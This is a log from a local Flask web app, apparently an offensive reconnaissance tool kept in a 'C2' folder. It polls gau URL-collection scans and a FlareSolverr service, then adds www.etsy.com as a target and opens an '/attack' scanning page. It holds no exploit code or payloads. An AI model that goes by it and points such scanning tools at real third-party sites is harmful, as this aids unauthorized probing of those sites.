2025-06-05 16:50:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:50:31] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:50:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:50:34] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:50:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:50:37] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:50:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:50:40] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:50:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:50:40] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 16:50:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:50:43] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:50:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:50:46] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:50:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:50:49] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:50:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:50:52] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:50:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:50:55] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:50:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:50:58] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:51:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:51:01] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:51:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:51:04] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:51:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:51:07] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:51:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:51:10] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:51:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:51:10] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 16:51:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:51:13] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:51:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:51:16] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:51:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:51:19] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:51:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:51:22] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:51:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:51:25] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:51:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:51:28] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:51:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:51:31] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:51:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:51:34] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:51:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:51:37] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:51:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:51:40] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:51:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:51:40] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 16:51:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:51:43] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:51:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:51:46] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:52:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:52:04] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:52:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:52:07] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:52:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:52:10] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:52:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:52:10] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 16:52:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:52:13] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:52:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:52:16] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:52:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:52:19] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:52:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:52:22] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:52:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:52:25] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:52:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:52:28] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:52:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:52:31] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:52:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:52:34] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:52:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:52:37] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:52:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:52:40] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:52:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:52:40] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 16:52:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:52:43] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:52:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:52:46] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:52:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:52:49] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:52:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:52:52] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:52:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:52:55] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:52:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:52:58] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:53:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:53:01] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:53:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:53:04] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:53:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:53:29] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:53:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:53:29] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 16:54:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:54:12] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 16:54:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:54:14] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:54:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:54:16] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:54:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:54:19] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:54:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:54:22] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:54:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:54:25] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:54:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:54:28] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:54:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:54:31] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:54:31 | INFO     | thread_gau.py:291 | _execute_gau_scan() | Gau扫描完成，正在处理结果...
2025-06-05 16:54:31 | INFO     | thread_gau.py:291 | _execute_gau_scan() | Gau扫描完成，正在处理结果...
2025-06-05 16:54:31 | INFO     | thread_gau.py:303 | _execute_gau_scan() | 输出文件大小: 0 字节
2025-06-05 16:54:31 | INFO     | thread_gau.py:303 | _execute_gau_scan() | 输出文件大小: 0 字节
2025-06-05 16:54:31 | INFO     | thread_gau.py:166 | _update_scan_result() | 已更新Gau扫描结果，目标ID: 1，当前URL总数: 0
2025-06-05 16:54:31 | INFO     | thread_gau.py:166 | _update_scan_result() | 已更新Gau扫描结果，目标ID: 1，当前URL总数: 0
2025-06-05 16:54:31 | INFO     | thread_gau.py:328 | _execute_gau_scan() | Gau扫描处理完成，目标ID: 1，总URL数: 0
2025-06-05 16:54:31 | INFO     | thread_gau.py:328 | _execute_gau_scan() | Gau扫描处理完成，目标ID: 1，总URL数: 0
2025-06-05 16:54:31 | INFO     | thread_gau.py:372 | _execute_gau_scan() | 已删除临时文件: /home/hacker/Desktop/C2/output/gau/gau_1_1749113388.txt
2025-06-05 16:54:31 | INFO     | thread_gau.py:372 | _execute_gau_scan() | 已删除临时文件: /home/hacker/Desktop/C2/output/gau/gau_1_1749113388.txt
2025-06-05 16:54:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:54:34] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:54:34 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 16:54:34 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 16:54:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:54:34] "GET /api/gau/history/1 HTTP/1.1" 200 -
2025-06-05 16:54:34 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 16:54:34 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 16:54:34 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 16:54:34 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 16:54:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:54:34] "GET /api/gau/result/1?page=1&per_page=50&category=all&search= HTTP/1.1" 200 -
2025-06-05 16:54:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:54:40] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 16:55:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:55:00] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:55:00 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 16:55:00 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 16:55:00 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 16:55:00 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 16:55:00 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 16:55:00 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 16:55:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:55:00] "GET /api/gau/result/1?page=1&per_page=50&category=all&search= HTTP/1.1" 200 -
2025-06-05 16:55:01 | INFO     | Gau_route.py:377 | gau_dashboard() | 正在載入 Gau 掃描器界面
2025-06-05 16:55:01 | INFO     | Gau_route.py:377 | gau_dashboard() | 正在載入 Gau 掃描器界面
2025-06-05 16:55:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:55:01] "GET /api/gau/dashboard?target_id=1 HTTP/1.1" 200 -
2025-06-05 16:55:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:55:01] "[36mGET /static/js/gau_dashboard.js HTTP/1.1[0m" 304 -
2025-06-05 16:55:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:55:01] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:55:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:55:01] "GET /api/gau/history/1 HTTP/1.1" 200 -
2025-06-05 16:55:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:55:01] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-05 16:55:01 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 16:55:01 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 16:55:01 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 16:55:01 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 16:55:01 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 16:55:01 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 16:55:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:55:01] "GET /api/gau/result/1?page=1&per_page=50&category=all&search= HTTP/1.1" 200 -
2025-06-05 16:55:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:55:02] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:55:02 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 16:55:02 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 16:55:02 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 16:55:02 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 16:55:02 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 16:55:02 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 16:55:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:55:02] "GET /api/gau/result/1?page=1&per_page=50&category=all&search= HTTP/1.1" 200 -
2025-06-05 16:55:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:55:03] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:55:03 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 16:55:03 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 16:55:03 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 16:55:03 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 16:55:03 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 16:55:03 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 16:55:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:55:03] "GET /api/gau/result/1?page=1&per_page=50&category=all&search= HTTP/1.1" 200 -
2025-06-05 16:55:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:55:03] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:55:03 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 16:55:03 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 16:55:03 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 16:55:03 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 16:55:03 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 16:55:03 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 16:55:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:55:03] "GET /api/gau/result/1?page=1&per_page=50&category=all&search= HTTP/1.1" 200 -
2025-06-05 16:55:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:55:03] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:55:03 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 16:55:03 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 16:55:03 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 16:55:03 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 16:55:03 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 16:55:03 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 16:55:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:55:03] "GET /api/gau/result/1?page=1&per_page=50&category=all&search= HTTP/1.1" 200 -
2025-06-05 16:55:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:55:03] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:55:03 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 16:55:03 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 16:55:03 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 16:55:03 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 16:55:03 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 16:55:03 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 16:55:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:55:03] "GET /api/gau/result/1?page=1&per_page=50&category=all&search= HTTP/1.1" 200 -
2025-06-05 16:55:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:55:10] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 16:55:41 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-05 16:55:41 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-05 16:55:41 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-05 16:55:41 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-05 16:55:41 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-05 16:55:41 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-05 16:55:41 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-05 16:55:41 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-05 16:55:41 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-05 16:55:41 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-05 16:55:41 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-05 16:55:41 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-05 16:55:41 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-05 16:55:41 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-05 16:55:41 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-05 16:55:41 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-05 16:55:41 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-05 16:55:41 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-05 16:55:41 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-05 16:55:41 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-05 16:55:41 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-05 16:55:41 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-05 16:55:41 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-05 16:55:41 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-05 16:55:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:55:51] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-05 16:55:54 | ERROR    | attack_route.py:20 | attack() | 加载扫描界面时出错: 404 Not Found: The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
2025-06-05 16:55:54 | ERROR    | attack_route.py:20 | attack() | 加载扫描界面时出错: 404 Not Found: The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
2025-06-05 16:55:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:55:54] "[35m[1mGET /attack/1 HTTP/1.1[0m" 500 -
2025-06-05 16:55:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:55:54] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-05 16:55:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:55:54] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-05 16:55:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:55:56] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-05 16:55:57 | INFO     | config.py:205 | wrapper() | 📞 調用函數 add_target (位置參數個數: 0, 關鍵字參數: [])
2025-06-05 16:55:57 | INFO     | config.py:210 | wrapper() | ✅ 函數 add_target 執行成功 (耗時: 0.006s)
2025-06-05 16:55:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:55:57] "GET /add_target HTTP/1.1" 200 -
2025-06-05 16:55:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:55:57] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-05 16:56:01 | INFO     | config.py:205 | wrapper() | 📞 調用函數 add_target (位置參數個數: 0, 關鍵字參數: [])
2025-06-05 16:56:01 | INFO     | index_routes.py:47 | add_target() | 收到添加目標請求: domain='www.etsy.com', target_ip='https://www.etsy.com/'
2025-06-05 16:56:01 | INFO     | index_routes.py:69 | add_target() | 嘗試添加新目標: target_ip=https://www.etsy.com/, domain=www.etsy.com
2025-06-05 16:56:01 | INFO     | index_routes.py:69 | add_target() | 嘗試添加新目標: target_ip=https://www.etsy.com/, domain=www.etsy.com
2025-06-05 16:56:01 | INFO     | index_routes.py:83 | add_target() | ✅ 成功添加目標: ID=1, target_ip=https://www.etsy.com/
2025-06-05 16:56:01 | INFO     | index_routes.py:83 | add_target() | ✅ 成功添加目標: ID=1, target_ip=https://www.etsy.com/
2025-06-05 16:56:01 | INFO     | index_routes.py:84 | add_target() | 目標添加成功: ID=1
2025-06-05 16:56:01 | INFO     | config.py:210 | wrapper() | ✅ 函數 add_target 執行成功 (耗時: 0.005s)
2025-06-05 16:56:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:56:01] "[32mPOST /add_target HTTP/1.1[0m" 302 -
2025-06-05 16:56:01 | INFO     | config.py:205 | wrapper() | 📞 調用函數 index (位置參數個數: 0, 關鍵字參數: [])
2025-06-05 16:56:01 | INFO     | index_routes.py:14 | index() | 用戶訪問首頁
2025-06-05 16:56:01 | INFO     | index_routes.py:17 | index() | 查詢到 1 個目標
2025-06-05 16:56:01 | INFO     | config.py:210 | wrapper() | ✅ 函數 index 執行成功 (耗時: 0.004s)
2025-06-05 16:56:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:56:01] "GET / HTTP/1.1" 200 -
2025-06-05 16:56:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:56:01] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-05 16:56:02 | INFO     | attack_route.py:16 | attack() | 加载扫描界面，目标ID: 1
2025-06-05 16:56:02 | INFO     | attack_route.py:16 | attack() | 加载扫描界面，目标ID: 1
2025-06-05 16:56:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:56:02] "GET /attack/1 HTTP/1.1" 200 -
2025-06-05 16:56:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:56:02] "[36mGET /static/css/attack.css HTTP/1.1[0m" 304 -
2025-06-05 16:56:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:56:02] "[36mGET /static/js/dist/bundle.js HTTP/1.1[0m" 304 -
2025-06-05 16:56:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:56:02] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-05 16:56:04 | INFO     | Gau_route.py:377 | gau_dashboard() | 正在載入 Gau 掃描器界面
2025-06-05 16:56:04 | INFO     | Gau_route.py:377 | gau_dashboard() | 正在載入 Gau 掃描器界面
2025-06-05 16:56:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:56:04] "GET /api/gau/dashboard?target_id=1 HTTP/1.1" 200 -
2025-06-05 16:56:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:56:04] "[36mGET /static/js/gau_dashboard.js HTTP/1.1[0m" 304 -
